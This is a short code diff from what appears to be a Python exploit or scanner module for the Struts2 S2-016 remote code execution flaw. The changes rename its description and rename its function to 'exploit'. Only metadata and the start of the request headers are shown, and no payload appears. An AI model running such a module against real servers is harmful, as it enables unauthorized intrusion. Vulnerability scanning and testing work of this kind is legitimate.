@@ -4,7 +4,7 @@ import requests
 
 author = ""
 scope = ""
-description = "Struts2 远程代码执行漏洞"
+description = "struts2_016_multipart_formdata__special"
 reference = ""
 options = [
     {
@@ -15,7 +15,7 @@ options = [
     }
 ]
 
-def struts2_016_multipart_formdata__special(URL):
+def exploit(URL):
     headers = {
         "Accept-Encoding": "gzip, deflate",
         "Connection": " Keep-Alive",
